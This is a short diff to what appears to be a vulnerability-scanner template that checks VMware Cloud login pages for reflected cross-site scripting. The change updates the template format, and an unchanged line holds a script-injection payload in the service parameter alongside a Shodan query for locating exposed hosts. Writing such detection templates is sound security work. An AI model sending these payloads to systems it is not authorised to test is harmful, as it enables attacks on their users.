@@ -5,11 +5,12 @@ info:
   author: tess
   severity: medium
   metadata:
+    max-request: 1
     verified: true
     shodan-query: title:"Vmware Cloud"
   tags: vmware,xss,cloud
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>'
